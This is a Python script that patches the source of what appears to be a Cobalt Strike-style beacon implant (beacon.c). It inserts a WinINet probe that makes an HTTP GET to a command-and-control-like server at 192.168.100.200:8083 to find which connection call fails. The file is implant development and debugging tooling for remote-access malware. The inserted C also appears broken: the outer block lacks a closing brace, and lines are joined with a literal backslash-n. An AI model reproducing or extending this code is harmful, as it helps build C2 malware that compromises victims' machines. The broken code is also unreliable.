# -*- coding: utf-8 -*-
r"""insert_preflight.py - insert the per-call gle preflight probe into the
restored (last-good) beacon.c, right before the main loop."""
import io

P = (r"C:\Users\Administrator\Desktop\cobaltstrike\bXZb-tmp"
     r"\openbeacon\Beacon\beacon.c")
s = io.open(P, encoding="utf-8").read()

BS = chr(92)
NL = BS + "n"
anchor = "\tSTRATEGY strategy = { 0, 0, 0 };"
assert anchor in s, "anchor missing"

probe = (
    "\t/* preflight wininet probe - locate exactly which call fails */" + NL +
    "\t{" + NL +
    '\t\tHINTERNET ho = InternetOpenA("probe", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);' + NL +
    '\t\t{ char tb[160]; sprintf(tb, "preflight: InternetOpenA=0x%p gle=%lu", (void*)ho, (unsigned long)GetLastError()); OBTRACE(tb); }' + NL +
    "\t\tif (ho != NULL) {" + NL +
    '\t\t\tHINTERNET hi = InternetConnectA(ho, "192.168.100.200", 8083, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);' + NL +
    '\t\t\t{ char tb[160]; sprintf(tb, "preflight: InternetConnectA=0x%p gle=%lu", (void*)hi, (unsigned long)GetLastError()); OBTRACE(tb); }' + NL +
    "\t\t\tif (hi != NULL) {" + NL +
    '\t\t\t\tHINTERNET hrq = HttpOpenRequestA(hi, "GET", "/activity", NULL, NULL, NULL, 0, 0);' + NL +
    '\t\t\t\t{ char tb[160]; sprintf(tb, "preflight: HttpOpenRequestA=0x%p gle=%lu", (void*)hrq, (unsigned long)GetLastError()); OBTRACE(tb); }' + NL +
    "\t\t\t\tBOOL sent = HttpSendRequestA(hrq, NULL, 0, NULL, 0);" + NL +
    '\t\t\t\t{ char tb[160]; sprintf(tb, "preflight: HttpSendRequestA=%d gle=%lu", sent, (unsigned long)GetLastError()); OBTRACE(tb); }' + NL +
    "\t\t\t\tInternetCloseHandle(hrq);" + NL +
    "\t\t\t\tInternetCloseHandle(hi);" + NL +
    "\t\t\t}" + NL +
    "\t\t\tInternetCloseHandle(ho);" + NL +
    "\t\t}" + NL
)
s = s.replace(anchor, probe + anchor)
io.open(P, "w", encoding="utf-8", newline="\n").write(s)
print("preflight inserted; size:", len(s))
